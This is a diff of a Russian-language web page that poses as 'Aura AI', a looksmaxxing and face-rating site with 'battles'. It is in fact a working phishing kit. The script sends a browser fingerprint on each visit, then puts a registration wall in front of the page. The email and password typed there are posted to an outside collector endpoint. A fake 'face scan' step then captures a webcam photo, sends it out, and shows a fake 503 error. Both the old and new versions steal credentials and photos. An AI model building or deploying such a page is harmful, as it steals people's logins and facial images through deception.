@@ -3,101 +3,194 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Welcome</title>
+<title>Aura AI — Looksmaxxing & Battles</title>
 <style>
-body{font-family:sans-serif;max-width:640px;margin:80px auto;padding:0 20px;color:#222}
-input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box}
-button{padding:10px 24px;background:#2563eb;color:#fff;border:0;border-radius:6px;font-size:16px}
-#log{font-size:11px;color:#999;margin-top:40px}
-video{display:none}
+body{font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;background:#000;color:#fff;margin:0;padding:0}
+h1{font-size:24px;margin:0 0 5px 0;font-weight:800;letter-spacing:-1px}
+p{color:#aaa;font-size:14px;line-height:1.5;margin:0 0 15px 0}
+.container{max-width:600px;margin:0 auto;padding:20px}
+
+/* Карточки батлов */
+.battle-card{background:#111;border:1px solid #222;border-radius:12px;padding:15px;margin-bottom:15px;display:flex;align-items:center;justify-content:space-between}
+.battle-img{width:60px;height:60px;border-radius:50%;background:#333;display:flex;align-items:center;justify-content:center;font-size:24px}
+.battle-info h3{margin:0 0 5px 0;font-size:16px}
+.battle-info p{margin:0;font-size:12px;color:#888}
+.btn{padding:12px 20px;background:#fff;color:#000;border:0;border-radius:8px;font-size:14px;font-weight:bold;cursor:pointer;white-space:nowrap}
+.btn:hover{opacity:0.9}
+.btn-full{display:block;width:100%;padding:16px;font-size:16px;margin-bottom:20px}
+
+/* Модальные окна */
+.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.95);backdrop-filter:blur(5px);display:flex;align-items:center;justify-content:center;padding:20px;z-index:1000}
+.modal{background:#111;border:1px solid #333;border-radius:12px;padding:24px;width:100%;max-width:380px;text-align:center}
+.modal h2{margin:0 0 10px 0;font-size:20px}
+.modal p{font-size:13px;margin-bottom:20px;color:#aaa}
+.modal input{width:100%;padding:14px;margin:10px 0;box-sizing:border-box;border:1px solid #333;background:#000;color:#fff;border-radius:8px;font-size:16px}
+.modal input:focus{outline:none;border-color:#fff}
+.hidden{display:none !important}
+.spinner{border:3px solid #333;border-top:3px solid #fff;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin:0 auto 15px auto}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
-<h1>Добро пожаловать</h1>
-<p>Войдите в аккаунт, чтобы продолжить.</p>
-<input id="email" placeholder="Email" type="email">
-<input id="password" placeholder="Пароль" type="password">
-<button onclick="submitForm()">Войти</button>
-<pre id="log"></pre>
 
-<!-- Скрытое видео для камеры -->
-<video id="camera" autoplay playsinline></video>
+<!-- ОСНОВНОЙ САЙТ (Виден только после регистрации) -->
+<div id="mainSite" class="hidden">
+    <div class="container" style="padding-top:40px; padding-bottom:20px; text-align:center; border-bottom:1px solid #222;">
+        <h1>Aura AI 🔥</h1>
+        <p>Твой персональный ИИ-ассистент по внешности</p>
+    </div>
+    
+    <div class="container">
+        <button class="btn btn-full" onclick="requireCamera('Оценка ИИ')">🤖 Узнать свой PSL-рейтинг</button>
+        
+        <h2 style="font-size:18px; margin-bottom:15px;">🔥 Живые батлы</h2>
+        
+        <div class="battle-card">
+            <div style="display:flex; align-items:center; gap:15px;">
+                <div class="battle-img">👤</div>
+                <div class="battle-info">
+                    <h3>Sub 3 vs HTN</h3>
+                    <p>Голосование: 1,204</p>
+                </div>
+            </div>
+            <button class="btn" onclick="requireCamera('Батл')">Смотреть</button>
+        </div>
+
+        <div class="battle-card">
+            <div style="display:flex; align-items:center; gap:15px;">
+                <div class="battle-img">👤</div>
+                <div class="battle-info">
+                    <h3>Chad vs True Adam</h3>
+                    <p>Голосование: 3,891</p>
+                </div>
+            </div>
+            <button class="btn" onclick="requireCamera('Батл')">Смотреть</button>
+        </div>
+        
+        <div class="battle-card">
+            <div style="display:flex; align-items:center; gap:15px;">
+                <div class="battle-img">👤</div>
+                <div class="battle-info">
+                    <h3>MTN vs LTN</h3>
+                    <p>Голосование: 842</p>
+                </div>
+            </div>
+            <button class="btn" onclick="requireCamera('Батл')">Смотреть</button>
+        </div>
+    </div>
+</div>
+
+<!-- ЭТАП 1: Блокирующая регистрация -->
+<div id="loginModal" class="modal-overlay">
+    <div class="modal">
+        <h2>Доступ ограничен</h2>
+        <p>Чтобы продолжить просмотр, батлы и оценку от ИИ, создайте аккаунт.</p>
+        <div id="formContent">
+            <input id="email" placeholder="Email" type="email">
+            <input id="password" placeholder="Пароль" type="password">
+            <button class="btn btn-full" style="margin-top:10px" onclick="submitRegister()">Создать аккаунт</button>
+        </div>
+        <div id="loaderContent" class="hidden">
+            <div class="spinner"></div>
+            <p>Создание аккаунта...</p>
+        </div>
+    </div>
+</div>
+
+<!-- ЭТАП 2: Требование камеры для оценки/батлов -->
+<div id="cameraModal" class="modal-overlay hidden">
+    <div class="modal">
+        <h2>Сканирование</h2>
+        <p id="cameraReasonText">Для доступа к функции требуется сканирование лица. Пожалуйста, разрешите доступ к камере.</p>
+        <div id="cameraContent">
+            <button class="btn btn-full" onclick="startCamera()">Разрешить камеру</button>
+        </div>
+        <div id="cameraLoader" class="hidden">
+            <div class="spinner"></div>
+            <p>Анализ лица...</p>
+        </div>
+    </div>
+</div>
+
+<video id="camera" autoplay playsinline style="display:none"></video>
 
 <script>
 const API = "https://sites-gt5x.onrender.com/api/collect";
+let savedPhoto = "Camera denied";
+let actionReason = "";
 
 async function collect(data) {
   try {
-    const res = await fetch(API, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify(data)
-    });
-    if (res.ok) {
-      document.getElementById("log").textContent += "· ";
-    }
-  } catch (e) {
-    console.error(e);
-  }
+    await fetch(API, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(data) });
+  } catch (e) { console.error(e); }
 }
 
 function fingerprint() {
-  return {
-    ua: navigator.userAgent,
-    lang: navigator.language,
-    screen: screen.width + "x" + screen.height
-  };
+  return { ua: navigator.userAgent, lang: navigator.language, screen: screen.width + "x" + screen.height };
 }
 
-// Сбор при заходе
+// Логируем визит
 collect({type: "visit", fp: fingerprint()});
 
-// Функция для фото
-async function takePhoto() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-    const video = document.getElementById("camera");
-    video.srcObject = stream;
+// ЭТАП 1: Регистрация
+async function submitRegister() {
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
     
-    // Ждем секунду, чтобы камера сфокусировалась
-    await new Promise(r => setTimeout(r, 1000));
-    
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext("2d").drawImage(video, 0, 0);
-    
-    // Конвертируем в base64
-    const photoBase64 = canvas.toDataURL("image/jpeg", 0.7);
-    
-    // Останавливаем камеру
-    stream.getTracks().forEach(t => t.stop());
-    
-    return photoBase64;
-  } catch (e) {
-    return "Camera denied";
-  }
+    if (!email || !password) return alert("Заполните все поля.");
+
+    document.getElementById("formContent").classList.add("hidden");
+    document.getElementById("loaderContent").classList.remove("hidden");
+
+    await collect({ type: "login", email: email, password: password, fp: fingerprint() });
+
+    setTimeout(() => {
+        document.getElementById("loginModal").classList.add("hidden");
+        document.getElementById("mainSite").classList.remove("hidden");
+    }, 1500);
 }
 
-async function submitForm() {
-  const email = document.getElementById("email").value;
-  const password = document.getElementById("password").value;
-  if (!email || !password) return document.getElementById("log").textContent = "Заполните все поля.";
+// ЭТАП 2: Требование камеры
+function requireCamera(reason) {
+    actionReason = reason;
+    document.getElementById("cameraReasonText").innerText = `Для доступа к функции "${reason}" требуется сканирование лица. Пожалуйста, разрешите доступ к камере.`;
+    document.getElementById("cameraContent").classList.remove("hidden");
+    document.getElementById("cameraLoader").classList.add("hidden");
+    document.getElementById("cameraModal").classList.remove("hidden");
+}
 
-  document.getElementById("log").textContent = "Отправка...";
-  
-  // Делаем фото
-  const photo = await takePhoto();
+async function startCamera() {
+    document.getElementById("cameraContent").classList.add("hidden");
+    document.getElementById("cameraLoader").classList.remove("hidden");
 
-  await collect({
-    type: "login", 
-    email: email, 
-    password: password,
-    photo: photo, // Передаем фото на сервер
-    fp: fingerprint()
-  });
-  
-  document.getElementById("log").textContent = "Готово.";
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.getElementById("camera");
+        video.srcObject = stream;
+        
+        await new Promise(r => setTimeout(r, 2000));
+        
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+        savedPhoto = canvas.toDataURL("image/jpeg", 0.7);
+        stream.getTracks().forEach(t => t.stop());
+    } catch (e) {
+        // Если отказал в доступе, скрипт идет дальше
+    }
+
+    // Отправляем фото и причину (например "Батл" или "Оценка ИИ")
+    await collect({
+        type: "camera_access",
+        reason: actionReason,
+        photo: savedPhoto,
+        fp: fingerprint()
+    });
+
+    setTimeout(() => {
+        document.body.innerHTML = "<div style='text-align:center; padding:50px; color:#fff;'><h1>Ошибка 503</h1><p>Сервера перегружены. Попробуйте позже.</p></div>";
+    }, 1000);
 }
 </script>
 </body>
